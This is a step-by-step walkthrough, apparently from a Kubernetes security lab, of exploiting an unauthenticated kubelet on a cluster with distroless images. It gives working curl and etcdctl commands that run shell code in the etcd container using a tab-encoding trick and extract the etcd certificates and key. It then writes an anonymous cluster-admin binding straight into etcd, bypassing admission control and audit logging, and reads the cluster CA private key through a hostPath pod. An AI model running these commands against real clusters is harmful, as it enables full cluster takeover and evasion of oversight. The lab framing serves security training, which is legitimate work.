## Unauthenticated Read/Write Kubelet (Hardened / Distroless)

The classic walkthrough (see `rwkubelet.md`) relies on running `cat` inside the API server container. In modern Kubernetes (v1.25+), control-plane containers are built on **distroless** images — there is no shell, no `cat`, no `ls`, and no standard utilities at all. This walkthrough shows how to still reach the CA private key using only the exposed kubelet API as an entry point.

### Overview

The attack chains through several pivots:

```
Kubelet API ──► etcd container (has sh + etcdctl)
    │
    ├─► Extract etcd client certificates
    │
    └─► Use certs to connect to etcd directly
            │
            └─► Write a ClusterRoleBinding granting system:anonymous cluster-admin
                    │
                    └─► Create a pod (via API server) with hostPath mount
                            │
                            └─► Read ca.key from the new pod via kubelet
```

### Step 1 — Enumerate pods via the kubelet API

```bash
curl -sk https://[CLUSTERIP]:10250/pods/ | jq '.items[].metadata.name'
```

Note the pod names — you'll need the etcd pod (`etcd-rwkubeletnoauth-control-plane`).

### Step 2 — Confirm the classic approach fails

Try the old method against the API server container:

```bash
curl -sk https://[CLUSTERIP]:10250/run/kube-system/kube-apiserver-rwkubeletnoauth-control-plane/kube-apiserver \
  -XPOST -d "cmd=cat /etc/kubernetes/pki/ca.key"
```

You'll get: `exec: "": executable file not found in $PATH`. The container has no `cat` binary.

### Step 3 — Find a container with a shell

The etcd container still ships `/bin/sh` (needed for migration tooling). Verify:

```bash
curl -sk "https://[CLUSTERIP]:10250/run/kube-system/etcd-rwkubeletnoauth-control-plane/etcd?cmd=sh" -XPOST
```

No error means `sh` exists. You can also confirm `etcdctl` is available:

```bash
curl -sk "https://[CLUSTERIP]:10250/run/kube-system/etcd-rwkubeletnoauth-control-plane/etcd?cmd=etcdctl+version" -XPOST
```

**Important note on the `/run` endpoint:** The kubelet splits the `cmd` query parameter on **spaces**. This means you can't pass `sh -c "echo hello"` in the POST body — it won't parse correctly. Instead, pass the command as the `cmd` **query parameter** and use `+` for spaces:

```
?cmd=sh+-c+<script_with_no_spaces>
```

### Step 4 — Read files using shell builtins (the tab trick)

Since the kubelet splits on spaces but the shell treats tabs as whitespace too, you can write shell scripts that use **tabs instead of spaces**. The kubelet passes the entire tab-containing string as a single argument to `sh -c`.

Read a file using `while read` (a shell builtin):

```bash
curl -sk "https://[CLUSTERIP]:10250/run/kube-system/etcd-rwkubeletnoauth-control-plane/etcd?cmd=sh+-c+while%09read%09REPLY%3Bdo%09echo%09%22%24REPLY%22%3Bdone%3C/etc/kubernetes/pki/etcd/ca.crt" -XPOST
```

Here `%09` is a tab character. The kubelet sees three words: `sh`, `-c`, and the script (which contains tabs, not spaces).

### Step 5 — Extract etcd client certificates

Use the technique from Step 4 to read the etcd server certificate and key. These are signed by the etcd CA and can be used for client authentication:

```bash
# CA certificate
curl -sk "https://[CLUSTERIP]:10250/run/kube-system/etcd-rwkubeletnoauth-control-plane/etcd?cmd=sh+-c+while%09read%09REPLY%3Bdo%09echo%09%22%24REPLY%22%3Bdone%3C/etc/kubernetes/pki/etcd/ca.crt" -XPOST > etcd-ca.crt

# Server certificate (used as client cert)
curl -sk "https://[CLUSTERIP]:10250/run/kube-system/etcd-rwkubeletnoauth-control-plane/etcd?cmd=sh+-c+while%09read%09REPLY%3Bdo%09echo%09%22%24REPLY%22%3Bdone%3C/etc/kubernetes/pki/etcd/server.crt" -XPOST > etcd-server.crt

# Server key
curl -sk "https://[CLUSTERIP]:10250/run/kube-system/etcd-rwkubeletnoauth-control-plane/etcd?cmd=sh+-c+while%09read%09REPLY%3Bdo%09echo%09%22%24REPLY%22%3Bdone%3C/etc/kubernetes/pki/etcd/server.key" -XPOST > etcd-server.key
```

### Step 6 — Connect to etcd directly and create a RBAC binding

With the extracted certificates you can talk to etcd from your machine. First verify access:

```bash
etcdctl get --prefix /registry/clusterrolebindings --keys-only \
  --endpoints=https://[CLUSTERIP]:2379 \
  --cacert=etcd-ca.crt --cert=etcd-server.crt --key=etcd-server.key
```

Now create a `ClusterRoleBinding` that grants `system:anonymous` the `cluster-admin` role. Kubernetes stores objects in etcd as protobuf, so you need to write a correctly encoded value. The included `exploit_rwkubelet.py` script handles this automatically, but the key idea is:

1. Encode a minimal `ClusterRoleBinding` protobuf with:
   - **metadata.name:** `anon-cluster-admin`
   - **subjects:** `[{kind: User, name: system:anonymous, apiGroup: rbac.authorization.k8s.io}]`
   - **roleRef:** `{apiGroup: rbac.authorization.k8s.io, kind: ClusterRole, name: cluster-admin}`
2. Wrap it in the Kubernetes storage envelope (`k8s\x00` header + TypeMeta + raw protobuf)
3. Write it to etcd at `/registry/clusterrolebindings/anon-cluster-admin`

```bash
# Using the exploit script (handles protobuf encoding):
python3 exploit_rwkubelet.py

# Or if doing it manually, write the protobuf bytes to a file and:
cat crb.bin | etcdctl put /registry/clusterrolebindings/anon-cluster-admin \
  --endpoints=https://[CLUSTERIP]:2379 \
  --cacert=etcd-ca.crt --cert=etcd-server.crt --key=etcd-server.key
```

The API server's RBAC cache refreshes within a few seconds. Verify anonymous access works:

```bash
curl -sk https://[CLUSTERIP]:6443/api/v1/namespaces | jq '.kind'
# Should return: "NamespaceList"
```

### Step 7 — Create a pod with a hostPath mount

Now that you have anonymous cluster-admin access, create a pod that mounts the node's `/etc/kubernetes/pki` directory:

```bash
curl -sk https://[CLUSTERIP]:6443/api/v1/namespaces/default/pods \
  -H "Content-Type: application/json" \
  -XPOST -d '{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {"name": "attacker-pod", "namespace": "default"},
    "spec": {
      "nodeName": "rwkubeletnoauth-control-plane",
      "tolerations": [{"operator": "Exists"}],
      "containers": [{
        "name": "attacker",
        "image": "busybox",
        "command": ["sleep", "3600"],
        "volumeMounts": [{"name": "host-pki", "mountPath": "/host-pki", "readOnly": true}]
      }],
      "volumes": [{
        "name": "host-pki",
        "hostPath": {"path": "/etc/kubernetes/pki", "type": "Directory"}
      }]
    }
  }'
```

Wait for it to start (check via the kubelet `/pods/` endpoint).

### Step 8 — Retrieve the CA private key

The attacker pod uses busybox which has standard tools. Read the key via the kubelet:

```bash
curl -sk https://[CLUSTERIP]:10250/run/default/attacker-pod/attacker \
  -XPOST -d "cmd=cat /host-pki/ca.key"
```

This returns the CA private key — the "golden key" to the cluster.

### Automated exploit

The `exploit_rwkubelet.py` script in the project root automates this entire chain. Run it after starting the cluster:

```bash
ansible-playbook rwkubelet-noauth.yml
python3 exploit_rwkubelet.py
```

### Cleanup

```bash
# Remove the attacker pod
curl -sk -XDELETE https://[CLUSTERIP]:6443/api/v1/namespaces/default/pods/attacker-pod

# Remove the RBAC binding from etcd
etcdctl del /registry/clusterrolebindings/anon-cluster-admin \
  --endpoints=https://[CLUSTERIP]:2379 \
  --cacert=etcd-ca.crt --cert=etcd-server.crt --key=etcd-server.key

# Delete the cluster
kind delete cluster --name=rwkubeletnoauth
```

### Why this works

- The kubelet API is exposed without authentication (`anonymous-auth: true`, `authorization-mode: AlwaysAllow`)
- Even though control-plane containers are distroless, the **etcd container** retains `/bin/sh` and `etcdctl` for migration support
- The etcd server certificates double as valid client certificates (they're signed by the etcd CA which is the trusted CA for client auth)
- Writing directly to etcd bypasses all API server admission control and audit logging
- The API server trusts etcd as its source of truth and picks up the new RBAC binding automatically
